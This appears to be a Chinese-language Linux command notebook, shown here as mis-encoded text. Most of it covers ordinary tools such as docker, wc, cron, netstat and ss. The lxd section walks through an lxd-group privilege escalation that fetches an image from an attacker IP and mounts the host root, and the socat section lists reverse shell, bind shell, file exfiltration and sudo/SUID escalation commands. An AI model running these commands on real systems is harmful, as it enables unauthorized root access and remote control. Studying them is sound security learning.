<h2 id="pts"><a href="#pts" class="headerlink" title="pts"></a>pts</h2><p>PTSï¼ˆPseudo Terminal Slaveï¼Œä¼ªç»ˆç«¯ä»è®¾å¤‡ï¼‰æ˜¯ä¸€ç§ ä¼ªç»ˆç«¯ï¼ˆPseudo Terminal, PTYï¼‰ è®¾å¤‡ï¼Œå®ƒç”¨äºæ”¯æŒç»ˆç«¯ä»¿çœŸï¼Œå¦‚ SSH è¿æ¥ã€screenã€tmuxã€scriptã€expect ç­‰å·¥å…·ã€‚å®ƒé€šå¸¸ä¸ PTY ä¸»è®¾å¤‡ï¼ˆMasterï¼‰ é…å¯¹ï¼Œç”¨äºæä¾›äº¤äº’å¼ç»ˆç«¯è®¿é—®ã€‚<br>åœ¨ Linux æˆ– macOS ä¸­ï¼Œå½“ä½ æ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯ä¼šè¯ï¼ˆå¦‚ ssh è¿œç¨‹è¿æ¥ã€tmux åˆ†å±ã€æˆ– screen ä¼šè¯ï¼‰ï¼Œç³»ç»Ÿä¼šä¸ºä½ åˆ†é…ä¸€ä¸ª ä¼ªç»ˆç«¯è®¾å¤‡ï¼Œé€šå¸¸æ ¼å¼ä¸ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/dev/</span>pts/N</span><br></pre></td></tr></table></figure></div>

<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>åç§°æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼š<code>docker inspect </code><br>åˆ—å‡ºæ‰€æœ‰å®¹å™¨: <code>docker ps -a</code><br>è¿›å…¥å®¹å™¨çš„äº¤äº’å¼shell : <code>docker exec -it &lt;container_id_or_name&gt; /bin/bash</code><br>æŸ¥çœ‹æ‰€æœ‰å·: <code>docker volume ls</code><br>åˆ é™¤å·ï¼š<code>docker volume rm &lt;volume_name&gt;</code></p>
<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p><code>wc</code>ï¼ˆ<strong>word count</strong>ï¼‰æ˜¯ä¸€ä¸ªç”¨äºç»Ÿè®¡æ–‡ä»¶å†…å®¹çš„å‘½ä»¤ï¼Œèƒ½å¤Ÿè®¡ç®— <strong>è¡Œæ•°ã€å•è¯æ•°ã€å­—ç¬¦æ•°å’Œå­—èŠ‚æ•°</strong>ã€‚</p>
<h3 id="å¸¸ç”¨å‚æ•°-7"><a href="#å¸¸ç”¨å‚æ•°-7" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a><strong>å¸¸ç”¨å‚æ•°</strong></h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>-l</code></td>
<td><strong>åªç»Ÿè®¡è¡Œæ•°</strong>ï¼ˆLinesï¼‰</td>
</tr>
<tr>
<td><code>-w</code></td>
<td><strong>åªç»Ÿè®¡å•è¯æ•°</strong>ï¼ˆWordsï¼‰</td>
</tr>
<tr>
<td><code>-c</code></td>
<td><strong>åªç»Ÿè®¡å­—èŠ‚æ•°</strong>ï¼ˆBytesï¼‰</td>
</tr>
<tr>
<td><code>-m</code></td>
<td><strong>åªç»Ÿè®¡å­—ç¬¦æ•°</strong>ï¼ˆCharactersï¼‰ï¼Œä¸ <code>-c</code> ç±»ä¼¼ï¼Œä½† <code>-m</code> é€‚ç”¨äºå¤šå­—èŠ‚å­—ç¬¦ï¼ˆå¦‚ UTF-8ï¼‰</td>
</tr>
<tr>
<td><code>-L</code></td>
<td><strong>è¾“å‡ºæœ€é•¿è¡Œçš„å­—ç¬¦æ•°</strong></td>
</tr>
</tbody></table>
<h2 id="sulogin"><a href="#sulogin" class="headerlink" title="sulogin"></a>sulogin</h2><p><code>sulogin</code> æ˜¯ <strong>Single User Loginï¼ˆå•ç”¨æˆ·æ¨¡å¼ç™»å½•ï¼‰</strong> çš„å‘½ä»¤ï¼Œé€šå¸¸ç”¨äº <strong>Linux&#x2F;Unix åœ¨å•ç”¨æˆ·æ¨¡å¼ï¼ˆç»´æŠ¤æ¨¡å¼ï¼‰ä¸‹ï¼Œä»¥ root èº«ä»½ç™»å½•</strong>ï¼Œç”¨äºä¿®å¤ç³»ç»Ÿæˆ–æ‰§è¡Œç»´æŠ¤ä»»åŠ¡ã€‚<br>åŸºæœ¬ç”¨æ³•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">sulogin <span class="selector-attr">[OPTIONS]</span> <span class="selector-attr">[TTY]</span></span><br></pre></td></tr></table></figure></div>

<table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>-p</td>
<td>å•ç”¨æˆ· Shell è°ƒç”¨ä¸€ä¸ªç ´æŠ˜å·ä½œä¸ºå‚æ•°ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>-t</td>
<td>ç¨‹åºåªä¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‡å®šç§’æ•°</td>
</tr>
<tr>
<td>ENVIRONMENT VARIABLES</td>
<td></td>
</tr>
<tr>
<td>sulogin looks for the environment variable SUSHELL or sushell to determine what shell to start. If the environment variable is not set, it will try to execute rootâ€™s shell from &#x2F;etc&#x2F;passwd. If that fails, it will fall</td>
<td></td>
</tr>
<tr>
<td>back to &#x2F;bin&#x2F;sh.</td>
<td></td>
</tr>
<tr>
<td>è¯´æ˜SUSHELLè¿™ä¸ªç¯å¢ƒå˜é‡å¯ä»¥æŒ‡å®šå¯åŠ¨ä»€ä¹ˆshell</td>
<td></td>
</tr>
</tbody></table>
<h2 id="cronå®šæ—¶ä»»åŠ¡"><a href="#cronå®šæ—¶ä»»åŠ¡" class="headerlink" title="cronå®šæ—¶ä»»åŠ¡"></a>cronå®šæ—¶ä»»åŠ¡</h2><p><code>cron</code> æ˜¯ <strong>Linux&#x2F;Unix</strong> ç³»ç»Ÿä¸­çš„å®šæ—¶ä»»åŠ¡è°ƒåº¦å·¥å…·ï¼Œå¯ç”¨äº <strong>å®šæœŸæ‰§è¡Œè„šæœ¬ã€å‘½ä»¤æˆ–ç¨‹åº</strong>ï¼Œé€‚ç”¨äº <strong>è‡ªåŠ¨å¤‡ä»½ã€æ—¥å¿—æ¸…ç†ã€å®šæ—¶ä»»åŠ¡ç­‰åœºæ™¯</strong>ã€‚<br>ç›¸å…³è·¯å¾„</p>
<table>
<thead>
<tr>
<th><strong>æ–‡ä»¶ &#x2F; ç›®å½•</strong></th>
<th><strong>ä½œç”¨</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>/etc/crontab</code></td>
<td><strong>ç³»ç»Ÿçº§</strong> crontab é…ç½®ï¼Œæ‰€æœ‰ç”¨æˆ·å…±äº«</td>
</tr>
<tr>
<td><code>/var/spool/cron/crontabs/</code></td>
<td><strong>å­˜æ”¾ç”¨æˆ·çš„ crontab</strong> ä»»åŠ¡æ–‡ä»¶ï¼ˆä¸èƒ½æ‰‹åŠ¨ç¼–è¾‘ï¼‰</td>
</tr>
<tr>
<td><code>/etc/cron.d/</code></td>
<td><strong>å­˜æ”¾ç³»ç»Ÿå®šæ—¶ä»»åŠ¡</strong>ï¼Œæ ¼å¼ä¸ <code>/etc/crontab</code> ç›¸åŒ</td>
</tr>
<tr>
<td><code>/etc/cron.hourly/</code></td>
<td><strong>æ¯å°æ—¶</strong> æ‰§è¡Œçš„è„šæœ¬ç›®å½•</td>
</tr>
<tr>
<td><code>/etc/cron.daily/</code></td>
<td><strong>æ¯å¤©</strong> æ‰§è¡Œçš„è„šæœ¬ç›®å½•</td>
</tr>
<tr>
<td><code>/etc/cron.weekly/</code></td>
<td><strong>æ¯å‘¨</strong> æ‰§è¡Œçš„è„šæœ¬ç›®å½•</td>
</tr>
<tr>
<td><code>/etc/cron.monthly/</code></td>
<td><strong>æ¯æœˆ</strong> æ‰§è¡Œçš„è„šæœ¬ç›®å½•</td>
</tr>
<tr>
<td><code>/var/log/syslog</code> æˆ– <code>/var/log/cron</code></td>
<td><strong>å­˜æ”¾ <code>cron</code> æ‰§è¡Œæ—¥å¿—</strong>ï¼ˆä¸åŒç³»ç»Ÿè·¯å¾„å¯èƒ½ä¸åŒï¼‰</td>
</tr>
</tbody></table>
<h2 id="lxd"><a href="#lxd" class="headerlink" title="lxd"></a>lxd</h2><p>LXD æ˜¯ä¸€ä¸ª root è¿›ç¨‹ï¼Œå®ƒè´Ÿè´£æ‰§è¡Œä»»æ„ç”¨æˆ·çš„ LXD UNIX å¥—æ¥å­—å†™å…¥è®¿é—®æ“ä½œã€‚è€Œä¸”åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒLXD ç”šè‡³éƒ½ä¸ä¼šè°ƒç”¨å®ƒçš„ç”¨æˆ·æƒé™è¿›è¡Œæ£€æŸ¥å’ŒåŒ¹é…</p>
<p>Linux Containerï¼ˆLXCï¼‰é€šå¸¸è¢«è®¤ä¸ºæ˜¯ä¸€ç§è½»é‡çº§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå®ƒä»‹äº Chroot å’Œå®Œæ•´å¼€å‘çš„è™šæ‹Ÿæœºä¹‹é—´ï¼ŒLXC å¯ä»¥åˆ›å»ºä¸€ä¸ªè·Ÿæ­£å¸¸ Linux æ“ä½œç³»ç»Ÿååˆ†æ¥è¿‘çš„ç¯å¢ƒï¼Œä½†æ˜¯ä¸éœ€è¦ä½¿ç”¨åˆ°å•ç‹¬çš„å†…æ ¸èµ„æºã€‚</p>
<p>Linux Daemonï¼ˆLXDï¼‰æ˜¯ä¸€ä¸ªè½»é‡çº§å®¹å™¨ç®¡ç†ç¨‹åºï¼Œè€Œ LXD æ˜¯åŸºäº LXC å®¹å™¨æŠ€æœ¯å®ç°çš„ï¼Œè€Œè¿™ç§æŠ€æœ¯ä¹‹å‰ Docker ä¹Ÿä½¿ç”¨è¿‡ã€‚LXD ä½¿ç”¨äº†ç¨³å®šçš„ LXC API æ¥å®Œæˆæ‰€æœ‰çš„åå°å®¹å™¨ç®¡ç†å·¥ä½œï¼Œå¹¶ä¸”å¢åŠ äº† REST API æ”¯æŒï¼Œæ›´è¿›ä¸€æ­¥åœ°æå‡äº†ç”¨æˆ·ä½“éªŒåº¦ã€‚<br>å¦‚æœä¸€ä¸ªæ™®é€šç”¨æˆ·å±äº <code>lxd</code> ç»„ï¼Œé‚£ä¹ˆä»–å°±å¯ä»¥ï¼š</p>
<ul>
<li>åˆ›å»º LXD å®¹å™¨</li>
<li>ä»¥ <code>security.privileged=true</code> çš„æ–¹å¼è¿è¡Œå®¹å™¨ï¼ˆå³è®©å®¹å™¨ä»¥ root æƒé™è¿è¡Œï¼‰</li>
<li>æŒ‚è½½å®¿ä¸»æœºçš„ç›®å½•åˆ°å®¹å™¨ä¸­ï¼Œç†è®ºä¸Šå¯ä»¥è®¿é—®æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿ</li>
</ul>
<p>ç”±äº <code>lxd</code> è¿›ç¨‹æ˜¯ä»¥ root æƒé™è¿è¡Œçš„ï¼Œè€Œ <code>lxd</code> ç»„ç”¨æˆ·å¯ä»¥æ§åˆ¶ <code>lxd</code>ï¼Œæ‰€ä»¥å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª <strong>â€œæƒé™å‡çº§çš„å…¥å£â€</strong>ã€‚<br><strong>ï¼ˆ2ï¼‰ææƒæµç¨‹</strong></p>
<p><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼š</p>
<ol>
<li><strong>åˆ©ç”¨ LXD ç»„æƒé™</strong> åˆ›å»ºä¸€ä¸ª <strong>ç‰¹æƒï¼ˆprivilegedï¼‰å®¹å™¨</strong>ï¼Œè¯¥å®¹å™¨å°†ä»¥ root è¿è¡Œã€‚</li>
<li><strong>æŒ‚è½½å®¿ä¸»æœºçš„æ ¹ç›®å½•</strong> åˆ°å®¹å™¨çš„ <code>/mnt/root</code> ç›®å½•ï¼Œä½¿å¾—å®¹å™¨å†…éƒ¨å¯ä»¥ç›´æ¥è®¿é—®å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿã€‚</li>
<li>è¿›å…¥å®¹å™¨åï¼Œåˆ©ç”¨ <code>chroot</code> è¿›å…¥ <code>/mnt/root</code>ï¼Œä»è€Œè·å¾—å®¿ä¸»æœºçš„ root æƒé™ã€‚<br>ææƒè¯¦ç»†è¿‡ç¨‹</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ï¼ˆ1ï¼‰è·å– Alpine Linux é•œåƒ</span></span><br><span class="line">wget http://æ”»å‡»æœºIP/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#lxdåˆå§‹åŒ–</span></span><br><span class="line">lxd init   <span class="comment">#ä¸€è·¯å›è½¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç„¶åå¯¼å…¥é•œåƒï¼š</span></span><br><span class="line">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span> image_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ›å»ºç‰¹æƒå®¹å™¨</span></span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æŒ‚è½½å®¿ä¸»æœºçš„æ ¹ç›®å½•</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯åŠ¨å¹¶è¿›å…¥å®¹å™¨</span></span><br><span class="line">lxc start ignite </span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ‡æ¢åˆ°å®¿ä¸»æœºç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/root</span><br></pre></td></tr></table></figure></div>

<h2 id="socatç«¯å£è½¬å‘"><a href="#socatç«¯å£è½¬å‘" class="headerlink" title="socatç«¯å£è½¬å‘"></a>socatç«¯å£è½¬å‘</h2><p><code>socat</code> ä¸»è¦ç”¨äºåœ¨ä¸¤ä¸ªæ•°æ®æµä¹‹é—´å»ºç«‹åŒå‘é€šä¿¡ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå¹¶å°†æ•°æ®è½¬å‘åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æŒ‡å®šç«¯å£ã€‚</p>
<h3 id="æœ¬åœ°ç«¯å£è½¬å‘ï¼ˆå°†æœ¬åœ°ç«¯å£æµé‡è½¬å‘åˆ°è¿œç¨‹ï¼‰"><a href="#æœ¬åœ°ç«¯å£è½¬å‘ï¼ˆå°†æœ¬åœ°ç«¯å£æµé‡è½¬å‘åˆ°è¿œç¨‹ï¼‰" class="headerlink" title="æœ¬åœ°ç«¯å£è½¬å‘ï¼ˆå°†æœ¬åœ°ç«¯å£æµé‡è½¬å‘åˆ°è¿œç¨‹ï¼‰"></a>æœ¬åœ°ç«¯å£è½¬å‘ï¼ˆå°†æœ¬åœ°ç«¯å£æµé‡è½¬å‘åˆ°è¿œç¨‹ï¼‰</h3><p>ç¤ºä¾‹ï¼šæœ¬åœ°ç›‘å¬ 8080ï¼Œå°†è¯·æ±‚è½¬å‘åˆ° 192.168.1.100:80</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">8080</span>,fork TCP:<span class="number">192.168.1.100:80</span></span><br></pre></td></tr></table></figure></div>
<h3 id="è¿œç¨‹ç«¯å£è½¬å‘ï¼ˆå°†è¿œç¨‹ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°ï¼‰"><a href="#è¿œç¨‹ç«¯å£è½¬å‘ï¼ˆå°†è¿œç¨‹ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°ï¼‰" class="headerlink" title="è¿œç¨‹ç«¯å£è½¬å‘ï¼ˆå°†è¿œç¨‹ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°ï¼‰"></a>è¿œç¨‹ç«¯å£è½¬å‘ï¼ˆå°†è¿œç¨‹ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°ï¼‰</h3><p>ç¤ºä¾‹ï¼šç›‘å¬è¿œç¨‹æœåŠ¡å™¨çš„ 9000 ç«¯å£ï¼Œå¹¶è½¬å‘åˆ°æœ¬åœ°çš„ 8080 ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">9000</span>,reuseaddr,fork TCP:<span class="number">127.0.0.1:8080</span></span><br></pre></td></tr></table></figure></div>
<h3 id="åå‘ä»£ç†ï¼ˆå°†è®¿é—®è¿œç¨‹ç«¯å£çš„è¯·æ±‚è½¬å‘åˆ°å¦ä¸€ä¸ªè¿œç¨‹åœ°å€ï¼‰"><a href="#åå‘ä»£ç†ï¼ˆå°†è®¿é—®è¿œç¨‹ç«¯å£çš„è¯·æ±‚è½¬å‘åˆ°å¦ä¸€ä¸ªè¿œç¨‹åœ°å€ï¼‰" class="headerlink" title="åå‘ä»£ç†ï¼ˆå°†è®¿é—®è¿œç¨‹ç«¯å£çš„è¯·æ±‚è½¬å‘åˆ°å¦ä¸€ä¸ªè¿œç¨‹åœ°å€ï¼‰"></a>åå‘ä»£ç†ï¼ˆå°†è®¿é—®è¿œç¨‹ç«¯å£çš„è¯·æ±‚è½¬å‘åˆ°å¦ä¸€ä¸ªè¿œç¨‹åœ°å€ï¼‰</h3><p>ç¤ºä¾‹ï¼šç›‘å¬æœ¬åœ° 4444 ç«¯å£ï¼Œå¹¶è½¬å‘åˆ°è¿œç¨‹ 10.10.10.10:5555</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">4444</span>,reuseaddr,fork TCP:<span class="number">10.10.10.10:5555</span></span><br></pre></td></tr></table></figure></div>
<h3 id="UDPç«¯å£è½¬å‘"><a href="#UDPç«¯å£è½¬å‘" class="headerlink" title="UDPç«¯å£è½¬å‘"></a>UDPç«¯å£è½¬å‘</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> UDP-LISTEN:<span class="number">9999</span>,reuseaddr,fork UDP:<span class="number">192.168.1.200:53</span></span><br></pre></td></tr></table></figure></div>
<h3 id="åå‘-Shellï¼ˆç›‘å¬è¿œç¨‹ä¸»æœºçš„åè¿ï¼‰"><a href="#åå‘-Shellï¼ˆç›‘å¬è¿œç¨‹ä¸»æœºçš„åè¿ï¼‰" class="headerlink" title="åå‘ Shellï¼ˆç›‘å¬è¿œç¨‹ä¸»æœºçš„åè¿ï¼‰"></a>åå‘ Shellï¼ˆç›‘å¬è¿œç¨‹ä¸»æœºçš„åè¿ï¼‰</h3><p>ç¤ºä¾‹ï¼šå—æ§æœºå™¨é€šè¿‡ <code>socat</code> è¿æ¥åˆ°æ”»å‡»æœº 4444 ç«¯å£ï¼Œå¹¶æä¾›äº¤äº’å¼ shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP:æ”»å‡»æœºIP:<span class="number">4444</span> EXEC:<span class="string">&quot;/bin/bash&quot;</span>,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>reuseaddr</code>ï¼šå…è®¸ç«¯å£é‡ç”¨ï¼Œé¿å… â€œç«¯å£å·²è¢«å ç”¨â€ çš„é—®é¢˜ã€‚</li>
<li><code>fork</code>ï¼šè®© <code>socat</code> å¤„ç†å¤šä¸ªè¿æ¥ï¼Œè€Œä¸æ˜¯åªæ¥å—ä¸€ä¸ªã€‚<br>ä¸Šé¢çš„æŒ‡ä»¤æœ€ååŠ ä¸Š&amp;,è®©å®ƒåœ¨åå°è¿›è¡Œ</li>
</ul>
<p>æ­¤å¤–socatè¿˜å¯è¿›è¡Œè¯»å–æ–‡ä»¶ï¼Œå†™å…¥æ–‡ä»¶ï¼Œsudoææƒï¼Œç­‰ç­‰  <a href="https://gtfobins.github.io/gtfobins/socat/">https://gtfobins.github.io/gtfobins/socat/</a></p>
<table>
<thead>
<tr>
<th><strong>åŠŸèƒ½</strong></th>
<th><strong>å‘½ä»¤</strong></th>
<th><strong>ä½œç”¨</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>å—é™ç¯å¢ƒé€ƒé€¸</strong></td>
<td><code>socat stdin exec:/bin/sh</code></td>
<td>åœ¨å—é™ç¯å¢ƒä¸­è·å–äº¤äº’å¼ shell</td>
</tr>
<tr>
<td><strong>åå‘ shell</strong></td>
<td><code>socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane</code></td>
<td>ç›®æ ‡æœºå‘æ”»å‡»è€…å›è¿ shell</td>
</tr>
<tr>
<td><strong>ç»‘å®š shell</strong></td>
<td><code>socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane</code></td>
<td>ç›®æ ‡æœºç›‘å¬ç«¯å£ï¼Œæ”»å‡»è€…è¿æ¥è·å– shell</td>
</tr>
<tr>
<td><strong>æ–‡ä»¶ä¸Šä¼ </strong></td>
<td><code>socat -u file:$LFILE tcp-connect:$RHOST:$RPORT</code></td>
<td>ç›®æ ‡æœºå‘æ”»å‡»è€…ä¸Šä¼ æ–‡ä»¶</td>
</tr>
<tr>
<td><strong>æ–‡ä»¶ä¸‹è½½</strong></td>
<td><code>socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat</code></td>
<td>æ”»å‡»è€…å‘ç›®æ ‡æœºå‘é€æ–‡ä»¶</td>
</tr>
<tr>
<td><strong>æ–‡ä»¶å†™å…¥</strong></td>
<td><code>socat -u &#39;exec:echo DATA&#39; &quot;open:$LFILE,creat&quot;</code></td>
<td>åœ¨ç›®æ ‡æœºå†™å…¥æ•°æ®</td>
</tr>
<tr>
<td><strong>æ–‡ä»¶è¯»å–</strong></td>
<td><code>socat -u &quot;file:$LFILE&quot; -</code></td>
<td>è¯»å–æ–‡ä»¶å†…å®¹</td>
</tr>
<tr>
<td><strong>sudo ææƒ</strong></td>
<td><code>sudo socat stdin exec:/bin/sh</code></td>
<td>å¦‚æœ <code>socat</code> å¯ç”¨ sudoï¼Œåˆ™å¯è·å– root shell</td>
</tr>
<tr>
<td><strong>SUID ææƒ</strong></td>
<td><code>sudo install -m =xs $(which socat) .</code></td>
<td>å¤åˆ¶ <code>socat</code> å¹¶åˆ©ç”¨ SUID ææƒ</td>
</tr>
</tbody></table>
<h2 id="netstat-lntup"><a href="#netstat-lntup" class="headerlink" title="netstat -lntup"></a>netstat -lntup</h2><p><code>netstat -lntup</code> æ˜¯ Linux ä¸‹ç”¨äºæŸ¥çœ‹å½“å‰ç›‘å¬çš„ç½‘ç»œç«¯å£åŠå…¶å¯¹åº”è¿›ç¨‹çš„å‘½ä»¤ã€‚</p>
<h3 id="å‚æ•°è§£æ"><a href="#å‚æ•°è§£æ" class="headerlink" title="å‚æ•°è§£æ"></a>å‚æ•°è§£æ</h3><ul>
<li><code>-l</code> (<code>--listening</code>)ï¼šæ˜¾ç¤º <strong>æ­£åœ¨ç›‘å¬</strong> çš„ç«¯å£ï¼ˆå³æœåŠ¡åœ¨ç­‰å¾…è¿æ¥ï¼‰ã€‚</li>
<li><code>-n</code> (<code>--numeric</code>)ï¼šä»¥ <strong>æ•°å­—æ ¼å¼</strong> æ˜¾ç¤º IP å’Œç«¯å£ï¼ˆä¸è§£æåŸŸåï¼‰ã€‚</li>
<li><code>-t</code> (<code>--tcp</code>)ï¼šæ˜¾ç¤º <strong>TCP</strong> ç«¯å£ã€‚</li>
<li><code>-u</code> (<code>--udp</code>)ï¼šæ˜¾ç¤º <strong>UDP</strong> ç«¯å£ã€‚</li>
<li><code>-p</code> (<code>--programs</code>)ï¼šæ˜¾ç¤º <strong>è¿›ç¨‹ä¿¡æ¯</strong>ï¼ˆå¦‚è¿›ç¨‹ ID å’Œåç§°ï¼‰ã€‚</li>
</ul>
<h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><p><code>ss</code>ï¼ˆ<strong>socket statistics</strong>ï¼‰æ˜¯ <code>netstat</code> çš„ç°ä»£æ›¿ä»£å·¥å…·ï¼Œç”¨äºæ˜¾ç¤ºå¥—æ¥å­—ï¼ˆsocketï¼‰ç›¸å…³ä¿¡æ¯ã€‚å®ƒæ¯” <code>netstat</code> æ›´å¿«ï¼Œå ç”¨æ›´å°‘çš„ç³»ç»Ÿèµ„æºï¼Œå¹¶ä¸”é»˜è®¤å®‰è£…åœ¨å¤§å¤šæ•° Linux å‘è¡Œç‰ˆä¸Šã€‚</p>
<h2 id="ğŸ”¹-å¸¸è§é€‰é¡¹"><a href="#ğŸ”¹-å¸¸è§é€‰é¡¹" class="headerlink" title="ğŸ”¹ å¸¸è§é€‰é¡¹"></a>ğŸ”¹ <strong>å¸¸è§é€‰é¡¹</strong></h2><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>-t</code></td>
<td>æ˜¾ç¤º TCP è¿æ¥</td>
</tr>
<tr>
<td><code>-u</code></td>
<td>æ˜¾ç¤º UDP è¿æ¥</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>ä»…æ˜¾ç¤ºç›‘å¬ï¼ˆLISTENï¼‰ç«¯å£</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>ä¸è§£æä¸»æœºåå’Œç«¯å£ï¼ˆæ˜¾ç¤ºæ•°å­—ï¼‰</td>
</tr>
<tr>
<td><code>-p</code></td>
<td>æ˜¾ç¤ºè¿›ç¨‹ PID å’Œåç§°</td>
</tr>
<tr>
<td><code>-a</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰è¿æ¥ï¼ˆåŒ…æ‹¬ç›‘å¬å’Œå·²å»ºç«‹çš„ï¼‰</td>
</tr>
<tr>
<td><code>-s</code></td>
<td>æ˜¾ç¤ºå¥—æ¥å­—ç»Ÿè®¡ä¿¡æ¯</td>
</tr>
<tr>
<td><code>-i</code></td>
<td>æ˜¾ç¤ºè¯¦ç»†çš„å†…éƒ¨ä¿¡æ¯</td>
</tr>
<tr>
<td><code>-4</code></td>
<td>ä»…æ˜¾ç¤º IPv4 è¿æ¥</td>
</tr>
<tr>
<td><code>-6</code></td>
<td>ä»…æ˜¾ç¤º IPv6 è¿æ¥</td>
</tr>
<tr>
<td>æŸ¥çœ‹æ­£åœ¨ä½¿ç”¨çš„ç«¯å£å°±ç”¨</td>
<td></td>
</tr>
</tbody></table>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ss -tulnp</span></span><br></pre></td></tr></table></figure></div>

<h2 id="shansum"><a href="#shansum" class="headerlink" title="shansum"></a>shansum</h2><p>ä»¥sha1sumä¸¾ä¾‹ã€‚<code>sha1sum</code> æ˜¯ Linux ä¸­ç”¨æ¥è®¡ç®—æ–‡ä»¶æˆ–å­—ç¬¦ä¸²çš„ <strong>SHA-1 å“ˆå¸Œå€¼</strong> çš„å‘½ä»¤ã€‚SHA-1ï¼ˆSecure Hash Algorithm 1ï¼‰æ˜¯ä¸€ç§å¸¸è§çš„å“ˆå¸Œç®—æ³•ï¼Œè¾“å‡º 160 ä½ï¼ˆ20 å­—èŠ‚ï¼‰çš„å“ˆå¸Œå€¼ï¼Œé€šå¸¸ç”¨ 40 ä¸ªåå…­è¿›åˆ¶å­—ç¬¦è¡¨ç¤ºã€‚</p>
<h3 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">sha1sum <span class="tag">&lt;<span class="name">filename</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
